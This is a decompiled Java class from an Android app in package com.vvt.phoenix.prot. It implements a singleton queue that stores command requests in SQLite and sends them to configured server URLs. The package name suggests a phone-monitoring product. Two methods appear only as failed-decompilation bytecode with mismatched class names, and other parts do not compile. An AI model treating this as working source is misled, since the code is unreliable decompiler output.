package com.vvt.phoenix.prot;

import android.database.sqlite.SQLiteException;
import com.vvt.phoenix.prot.command.a.s;
import java.util.Iterator;
import java.util.concurrent.PriorityBlockingQueue;

public class c
  extends com.vvt.async.a
{
  private static final boolean b;
  private static c c;
  private static com.vvt.phoenix.prot.b.b d;
  private static PriorityBlockingQueue e;
  private static e f;
  private static String g;
  private static String h;
  public com.vvt.http.a a;
  private com.vvt.phoenix.prot.c.b i;
  
  static
  {
    boolean bool = com.vvt.ak.a.b;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      b = bool;
      return;
    }
  }
  
  private c(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    Object localObject = new com/vvt/phoenix/prot/b/b;
    ((com.vvt.phoenix.prot.b.b)localObject).<init>(paramString1, paramString2);
    d = (com.vvt.phoenix.prot.b.b)localObject;
    g = paramString3;
    h = paramString4;
    localObject = new java/util/concurrent/PriorityBlockingQueue;
    ((PriorityBlockingQueue)localObject).<init>();
    e = (PriorityBlockingQueue)localObject;
    localObject = new com/vvt/phoenix/prot/e;
    ((e)localObject).<init>(this);
    f = (e)localObject;
  }
  
  public static c a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    if (paramString1 == null)
    {
      localObject = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject).<init>("Database directory path is null");
      throw ((Throwable)localObject);
    }
    if (paramString2 == null)
    {
      localObject = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject).<init>("Payload directory path is null");
      throw ((Throwable)localObject);
    }
    if (paramString3 == null)
    {
      localObject = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject).<init>("Unstructured URL is null");
      throw ((Throwable)localObject);
    }
    if (paramString4 == null)
    {
      localObject = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject).<init>("Strucuted URL is null");
      throw ((Throwable)localObject);
    }
    Object localObject = c;
    if (localObject == null)
    {
      localObject = new com/vvt/phoenix/prot/c;
      ((c)localObject).<init>(paramString1, paramString2, paramString3, paramString4);
      c = (c)localObject;
    }
    try
    {
      localObject = d;
      ((com.vvt.phoenix.prot.b.b)localObject).a();
      return c;
    }
    catch (SQLiteException localSQLiteException)
    {
      c = null;
      throw localSQLiteException;
    }
  }
  
  private boolean b(long paramLong)
  {
    Object localObject1 = e;
    Object localObject2 = ((PriorityBlockingQueue)localObject1).iterator();
    boolean bool2;
    do
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (l)((Iterator)localObject2).next();
      long l = ((l)localObject1).e();
      bool2 = l < paramLong;
    } while (bool2);
    localObject2 = e;
    boolean bool1 = ((PriorityBlockingQueue)localObject2).remove(localObject1);
    if (bool1)
    {
      localObject1 = d;
      bool1 = ((com.vvt.phoenix.prot.b.b)localObject1).b(paramLong);
      if (bool1) {}
      bool1 = true;
    }
    for (;;)
    {
      return bool1;
      bool1 = false;
      localObject1 = null;
      continue;
      bool1 = false;
      localObject1 = null;
    }
  }
  
  private boolean c(long paramLong)
  {
    e locale = f;
    long l = locale.a();
    boolean bool = l < paramLong;
    if (!bool)
    {
      locale = f;
      locale.b();
      bool = true;
    }
    for (;;)
    {
      return bool;
      bool = false;
      locale = null;
    }
  }
  
  /* Error */
  public long a(long paramLong, a parama)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore 4
    //   4: aload_0
    //   5: monitorenter
    //   6: getstatic 27	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:removeFromPath	Z
    //   9: istore 6
    //   11: iload 6
    //   13: ifeq +3 -> 16
    //   16: getstatic 38	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:d	Lcom/vvt/phoenix/prot/removeFromPath/removeFromPath;
    //   19: astore 7
    //   21: aload 7
    //   23: lload_1
    //   24: invokevirtual 118	com/vvt/phoenix/prot/removeFromPath/removeFromPath:a	(J)Lcom/vvt/phoenix/prot/removeFromPath/a;
    //   27: astore 7
    //   29: aload 7
    //   31: ifnonnull +18 -> 49
    //   34: getstatic 27	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:removeFromPath	Z
    //   37: istore 6
    //   39: iload 6
    //   41: ifeq +3 -> 44
    //   44: aload_0
    //   45: monitorexit
    //   46: lload 4
    //   48: lreturn
    //   49: aload 7
    //   51: invokevirtual 122	com/vvt/phoenix/prot/removeFromPath/a:e	()Z
    //   54: istore 8
    //   56: iload 8
    //   58: ifne +24 -> 82
    //   61: getstatic 38	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:d	Lcom/vvt/phoenix/prot/removeFromPath/removeFromPath;
    //   64: astore 7
    //   66: aload 7
    //   68: lload_1
    //   69: invokevirtual 111	com/vvt/phoenix/prot/removeFromPath/removeFromPath:removeFromPath	(J)Z
    //   72: istore 6
    //   74: iload 6
    //   76: ifne -32 -> 44
    //   79: goto -35 -> 44
    //   82: new 124	com/vvt/phoenix/prot/n
    //   85: astore 9
    //   87: aload 9
    //   89: invokespecial 125	com/vvt/phoenix/prot/n:<init>	()V
    //   92: iconst_3
    //   93: istore 10
    //   95: aload 9
    //   97: iload 10
    //   99: invokevirtual 129	com/vvt/phoenix/prot/n:removeFromPath	(I)V
    //   102: aload 9
    //   104: aload 7
    //   106: invokevirtual 132	com/vvt/phoenix/prot/n:a	(Lcom/vvt/phoenix/prot/removeFromPath/a;)V
    //   109: aload 9
    //   111: aload_3
    //   112: invokevirtual 135	com/vvt/phoenix/prot/n:a	(Lcom/vvt/phoenix/prot/a;)V
    //   115: iconst_1
    //   116: istore 10
    //   118: aload 9
    //   120: iload 10
    //   122: invokevirtual 137	com/vvt/phoenix/prot/n:a	(I)V
    //   125: aload 9
    //   127: lload_1
    //   128: invokevirtual 140	com/vvt/phoenix/prot/n:a	(J)V
    //   131: getstatic 47	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:e	Ljava/util/concurrent/PriorityBlockingQueue;
    //   134: astore 11
    //   136: aload 11
    //   138: aload 9
    //   140: invokevirtual 143	java/util/concurrent/PriorityBlockingQueue:add	(Ljava/lang/Object;)Z
    //   143: pop
    //   144: getstatic 54	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:f	Lcom/vvt/phoenix/prot/e;
    //   147: astore 9
    //   149: aload 9
    //   151: aload_3
    //   152: invokevirtual 144	com/vvt/phoenix/prot/e:a	(Lcom/vvt/phoenix/prot/a;)V
    //   155: aload 7
    //   157: invokevirtual 145	com/vvt/phoenix/prot/removeFromPath/a:a	()J
    //   160: lstore 4
    //   162: goto -118 -> 44
    //   165: astore 9
    //   167: aload_0
    //   168: monitorexit
    //   169: aload 9
    //   171: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	172	0	this	MyUncaughtExceptionHandler
    //   0	172	1	paramLong	long
    //   0	172	3	parama	a
    //   2	159	4	l	long
    //   9	66	6	bool1	boolean
    //   19	137	7	localObject1	Object
    //   54	3	8	bool2	boolean
    //   85	65	9	localObject2	Object
    //   165	5	9	localObject3	Object
    //   93	28	10	j	int
    //   134	3	11	localPriorityBlockingQueue	PriorityBlockingQueue
    // Exception table:
    //   from	to	target	type
    //   6	9	165	finally
    //   16	19	165	finally
    //   23	27	165	finally
    //   34	37	165	finally
    //   49	54	165	finally
    //   61	64	165	finally
    //   68	72	165	finally
    //   82	85	165	finally
    //   87	92	165	finally
    //   97	102	165	finally
    //   104	109	165	finally
    //   111	115	165	finally
    //   120	125	165	finally
    //   127	131	165	finally
    //   131	134	165	finally
    //   138	144	165	finally
    //   144	147	165	finally
    //   151	155	165	finally
    //   155	160	165	finally
  }
  
  public long a(b paramb)
  {
    long l1 = -1;
    int j = 1;
    int k = 2;
    Object localObject3;
    if (paramb == null) {
      try
      {
        IllegalArgumentException localIllegalArgumentException = new java/lang/IllegalArgumentException;
        localObject3 = "Command Request is NULL";
        localIllegalArgumentException.<init>((String)localObject3);
        throw localIllegalArgumentException;
      }
      finally {}
    }
    Object localObject4 = paramb.b();
    Object localObject5 = paramb.c();
    Object localObject2;
    if (localObject4 == null)
    {
      localObject2 = new java/lang/IllegalArgumentException;
      localObject3 = "Meta Data is NULL";
      ((IllegalArgumentException)localObject2).<init>((String)localObject3);
      throw ((Throwable)localObject2);
    }
    if (localObject5 == null)
    {
      localObject2 = new java/lang/IllegalArgumentException;
      localObject3 = "Command Data is NULL";
      ((IllegalArgumentException)localObject2).<init>((String)localObject3);
      throw ((Throwable)localObject2);
    }
    localObject4 = d;
    localObject4 = ((com.vvt.phoenix.prot.b.b)localObject4).a(paramb);
    h localh = new com/vvt/phoenix/prot/h;
    localh.<init>();
    long l2 = ((com.vvt.phoenix.prot.b.a)localObject4).a();
    localh.a(l2);
    String str = ((com.vvt.phoenix.prot.b.a)localObject4).c();
    localh.a(str);
    localh.a(paramb);
    int m = paramb.a();
    localh.a(m);
    int n = ((com.vvt.phoenix.prot.command.b)localObject5).a();
    switch (n)
    {
    }
    for (;;)
    {
      return l1;
      k = j;
      label396:
      localh.b(k);
      if (k == j) {}
      try
      {
        localObject5 = d;
        boolean bool2 = ((com.vvt.phoenix.prot.b.b)localObject5).a((com.vvt.phoenix.prot.b.a)localObject4);
        if (!bool2) {
          continue;
        }
        localObject5 = e;
        bool2 = ((PriorityBlockingQueue)localObject5).add(localh);
        if (bool2)
        {
          localObject2 = f;
          localObject3 = paramb.d();
          ((e)localObject2).a((a)localObject3);
          l1 = ((com.vvt.phoenix.prot.b.a)localObject4).a();
          continue;
          k = j;
          break label396;
          k = j;
          break label396;
          k = j;
          break label396;
          k = j;
          break label396;
        }
        if (k != j) {
          continue;
        }
        com.vvt.phoenix.prot.b.b localb = d;
        long l3 = ((com.vvt.phoenix.prot.b.a)localObject4).a();
        boolean bool1 = localb.b(l3);
        if (bool1) {
          continue;
        }
      }
      catch (RuntimeException localRuntimeException) {}
    }
  }
  
  protected void a(a parama, int paramInt, Object... paramVarArgs)
  {
    int j = 1;
    Object localObject = null;
    switch (paramInt)
    {
    }
    for (;;)
    {
      return;
      long l = ((Long)paramVarArgs[0]).longValue();
      localObject = (Exception)paramVarArgs[j];
      parama.a(l, (Exception)localObject);
      continue;
      l = ((Long)paramVarArgs[0]).longValue();
      localObject = (Exception)paramVarArgs[j];
      parama.b(l, (Exception)localObject);
      continue;
      l = ((Long)paramVarArgs[0]).longValue();
      localObject = (Exception)paramVarArgs[j];
      parama.c(l, (Exception)localObject);
      continue;
      localObject = (s)paramVarArgs[0];
      parama.b((s)localObject);
      continue;
      localObject = (s)paramVarArgs[0];
      parama.a((s)localObject);
      continue;
      l = ((Long)paramVarArgs[0]).longValue();
      localObject = (Exception)paramVarArgs[j];
      parama.d(l, (Exception)localObject);
    }
  }
  
  public void a(String paramString)
  {
    g = paramString;
  }
  
  /* Error */
  public boolean a(long paramLong)
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: aload_0
    //   3: lload_1
    //   4: invokespecial 217	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:removeFromPath	(J)Z
    //   7: istore_3
    //   8: iload_3
    //   9: ifeq +9 -> 18
    //   12: iconst_1
    //   13: istore_3
    //   14: aload_0
    //   15: monitorexit
    //   16: iload_3
    //   17: ireturn
    //   18: aload_0
    //   19: lload_1
    //   20: invokespecial 219	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	(J)Z
    //   23: istore_3
    //   24: iload_3
    //   25: ifne -13 -> 12
    //   28: iconst_0
    //   29: istore_3
    //   30: aconst_null
    //   31: astore 4
    //   33: goto -19 -> 14
    //   36: astore 4
    //   38: aload_0
    //   39: monitorexit
    //   40: aload 4
    //   42: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	43	0	this	MyUncaughtExceptionHandler
    //   0	43	1	paramLong	long
    //   7	23	3	bool	boolean
    //   31	1	4	localObject1	Object
    //   36	5	4	localObject2	Object
    // Exception table:
    //   from	to	target	type
    //   3	7	36	finally
    //   19	23	36	finally
  }
  
  public void b(String paramString)
  {
    h = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */